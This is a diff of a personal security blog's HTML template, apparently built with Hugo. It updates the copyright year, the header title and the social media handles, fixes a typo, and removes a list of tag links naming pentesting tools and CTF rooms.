             <footer class="ui basic center aligned segment" style="background-color: transparent;">
               
-              <p>© 2010 - 2022 Classroom</p>
+              <p>© 2010 - 2023 Classroom</p>
               
 
               
@@ -928,7 +922,7 @@ data-ad-slot="7160066188"></ins></p>
   </div>
 
   <div class="content">
-    <h1 class="ui medium header">Classroom Notes &amp; Blog Posts<div class="sub header"></div>
+    <h1 class="ui medium header">Reading Stuffs<div class="sub header"></div>
     </h1>
 
     <article class="ui horizontal list">
@@ -941,307 +935,6 @@ data-ad-slot="7160066188"></ins></p>
       </a>
     </article>
 
-    
-    <article class="dream-tags">
-    
-      <a class="ui label" href="/tags/agent-sudo/" title="Agent Sudo">
-        Agent Sudo
-      </a>
-    
-      <a class="ui label" href="/tags/autopsy/" title="autopsy">
-        autopsy
-      </a>
-    
-      <a class="ui label" href="/tags/backdoor/" title="backdoor">
-        backdoor
-      </a>
-    
-      <a class="ui label" href="/tags/baron-samedit/" title="Baron Samedit">
-        Baron Samedit
-      </a>
-    
-      <a class="ui label" href="/tags/bash/" title="bash">
-        bash
-      </a>
-    
-      <a class="ui label" href="/tags/ceh0821/" title="ceh0821">
-        ceh0821
-      </a>
-    
-      <a class="ui label" href="/tags/cheatsheet/" title="cheatsheet">
-        cheatsheet
-      </a>
-    
-      <a class="ui label" href="/tags/config/" title="config">
-        config
-      </a>
-    
-      <a class="ui label" href="/tags/couch/" title="couch">
-        couch
-      </a>
-    
-      <a class="ui label" href="/tags/crisis/" title="Crisis">
-        Crisis
-      </a>
-    
-      <a class="ui label" href="/tags/dominos/" title="dominos">
-        dominos
-      </a>
-    
-      <a class="ui label" href="/tags/empire/" title="Empire">
-        Empire
-      </a>
-    
-      <a class="ui label" href="/tags/encryption/" title="encryption">
-        encryption
-      </a>
-    
-      <a class="ui label" href="/tags/ffuf/" title="ffuf">
-        ffuf
-      </a>
-    
-      <a class="ui label" href="/tags/forensic/" title="forensic">
-        forensic
-      </a>
-    
-      <a class="ui label" href="/tags/gitandcrumpets/" title="gitandcrumpets">
-        gitandcrumpets
-      </a>
-    
-      <a class="ui label" href="/tags/gnupg/" title="gnupg">
-        gnupg
-      </a>
-    
-      <a class="ui label" href="/tags/hackpark/" title="HackPark">
-        HackPark
-      </a>
-    
-      <a class="ui label" href="/tags/hydra/" title="hydra">
-        hydra
-      </a>
-    
-      <a class="ui label" href="/tags/inclusion/" title="inclusion">
-        inclusion
-      </a>
-    
-      <a class="ui label" href="/tags/internal/" title="internal">
-        internal
-      </a>
-    
-      <a class="ui label" href="/tags/internship/" title="Internship">
-        Internship
-      </a>
-    
-      <a class="ui label" href="/tags/interview/" title="interview">
-        interview
-      </a>
-    
-      <a class="ui label" href="/tags/kenobi/" title="kenobi">
-        kenobi
-      </a>
-    
-      <a class="ui label" href="/tags/lab/" title="lab">
-        lab
-      </a>
-    
-      <a class="ui label" href="/tags/leaks/" title="leaks">
-        leaks
-      </a>
-    
-      <a class="ui label" href="/tags/linux/" title="Linux">
-        Linux
-      </a>
-    
-      <a class="ui label" href="/tags/memory/" title="memory">
-        memory
-      </a>
-    
-      <a class="ui label" href="/tags/metamorphosis/" title="Metamorphosis">
-        Metamorphosis
-      </a>
-    
-      <a class="ui label" href="/tags/metasploit/" title="metasploit">
-        metasploit
-      </a>
-    
-      <a class="ui label" href="/tags/mobile/" title="Mobile">
-        Mobile
-      </a>
-    
-      <a class="ui label" href="/tags/msf/" title="msf">
-        msf
-      </a>
-    
-      <a class="ui label" href="/tags/msfvenom/" title="msfvenom">
-        msfvenom
-      </a>
-    
-      <a class="ui label" href="/tags/nfs/" title="nfs">
-        nfs
-      </a>
-    
-      <a class="ui label" href="/tags/notes/" title="notes">
-        notes
-      </a>
-    
-      <a class="ui label" href="/tags/openvas/" title="openvas">
-        openvas
-      </a>
-    
-      <a class="ui label" href="/tags/osi/" title="OSI">
-        OSI
-      </a>
-    
-      <a class="ui label" href="/tags/osi-model/" title="OSI Model">
-        OSI Model
-      </a>
-    
-      <a class="ui label" href="/tags/overpass-2/" title="Overpass 2">
-        Overpass 2
-      </a>
-    
-      <a class="ui label" href="/tags/pentesting/" title="Pentesting">
-        Pentesting
-      </a>
-    
-      <a class="ui label" href="/tags/pgp/" title="PGP">
-        PGP
-      </a>
-    
-      <a class="ui label" href="/tags/pip/" title="pip">
-        pip
-      </a>
-    
-      <a class="ui label" href="/tags/pip2/" title="pip2">
-        pip2
-      </a>
-    
-      <a class="ui label" href="/tags/post-exploitation/" title="Post-Exploitation">
-        Post-Exploitation
-      </a>
-    
-      <a class="ui label" href="/tags/powershell/" title="powershell">
-        powershell
-      </a>
-    
-      <a class="ui label" href="/tags/putty/" title="putty">
-        putty
-      </a>
-    
-      <a class="ui label" href="/tags/python/" title="python">
-        python
-      </a>
-    
-      <a class="ui label" href="/tags/razorblack/" title="RazorBlack">
-        RazorBlack
-      </a>
-    
-      <a class="ui label" href="/tags/redteaming/" title="redteaming">
-        redteaming
-      </a>
-    
-      <a class="ui label" href="/tags/ref/" title="Ref">
-        Ref
-      </a>
-    
-      <a class="ui label" href="/tags/relevant/" title="Relevant">
-        Relevant
-      </a>
-    
-      <a class="ui label" href="/tags/rocket/" title="rocket">
-        rocket
-      </a>
-    
-      <a class="ui label" href="/tags/rooms/" title="rooms">
-        rooms
-      </a>
-    
-      <a class="ui label" href="/tags/rootme/" title="RootMe">
-        RootMe
-      </a>
-    
-      <a class="ui label" href="/tags/rpwebscanning/" title="rpwebscanning">
-        rpwebscanning
-      </a>
-    
-      <a class="ui label" href="/tags/script/" title="script">
-        script
-      </a>
-    
-      <a class="ui label" href="/tags/scripting/" title="Scripting">
-        Scripting
-      </a>
-    
-      <a class="ui label" href="/tags/simple-ctf/" title="Simple CTF">
-        Simple CTF
-      </a>
-    
-      <a class="ui label" href="/tags/splunk/" title="splunk">
-        splunk
-      </a>
-    
-      <a class="ui label" href="/tags/stego/" title="stego">
-        stego
-      </a>
-    
-      <a class="ui label" href="/tags/super-spam/" title="Super-Spam">
-        Super-Spam
-      </a>
-    
-      <a class="ui label" href="/tags/sweettoothinc/" title="sweettoothinc">
-        sweettoothinc
-      </a>
-    
-      <a class="ui label" href="/tags/sysmon/" title="sysmon">
-        sysmon
-      </a>
-    
-      <a class="ui label" href="/tags/thefindcommand/" title="Thefindcommand">
-        Thefindcommand
-      </a>
-    
-      <a class="ui label" href="/tags/thm/" title="thm">
-        thm
-      </a>
-    
-      <a class="ui label" href="/tags/tmux/" title="tmux">
-        tmux
-      </a>
-    
-      <a class="ui label" href="/tags/tools/" title="tools">
-        tools
-      </a>
-    
-      <a class="ui label" href="/tags/tryhackme/" title="tryhackme">
-        tryhackme
-      </a>
-    
-      <a class="ui label" href="/tags/vapt/" title="vapt">
-        vapt
-      </a>
-    
-      <a class="ui label" href="/tags/volatility/" title="Volatility">
-        Volatility
-      </a>
-    
-      <a class="ui label" href="/tags/vuln-labs/" title="vuln labs">
-        vuln labs
-      </a>
-    
-      <a class="ui label" href="/tags/vulnversity/" title="Vulnversity">
-        Vulnversity
-      </a>
-    
-      <a class="ui label" href="/tags/web-scanning/" title="web scanning">
-        web scanning
-      </a>
-    
-      <a class="ui label" href="/tags/wireshark/" title="wireshark">
-        wireshark
-      </a>
-    
-    </article>
-    
   </div>
 </header>
 
@@ -1281,7 +974,7 @@ data-ad-slot="7160066188"></ins></p>
 
   
   <div class="item">
-    <a href="https://facebook.com/anir0yofficial" target="_blank">
+    <a href="https://facebook.com/0xanir0y" target="_blank">
       <i class="large facebook icon" title="Facebook"></i>
     </a>
   </div>
@@ -1289,7 +982,7 @@ data-ad-slot="7160066188"></ins></p>
 
   
   <div class="item">
-    <a href="https://instagram.com/anir0yofficial" target="_blank">
+    <a href="https://instagram.com/0xanir0y" target="_blank">
       <i class="large instagram icon" title="Instagram"></i>
     </a>
   </div>
@@ -1324,7 +1017,7 @@ data-ad-slot="7160066188"></ins></p>
   <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
     
     <article class="ui segment">
-      YOU CAN RESUE MY CONTENT
+      YOU CAN REUSE MY CONTENT
     </article>
     
   </div>
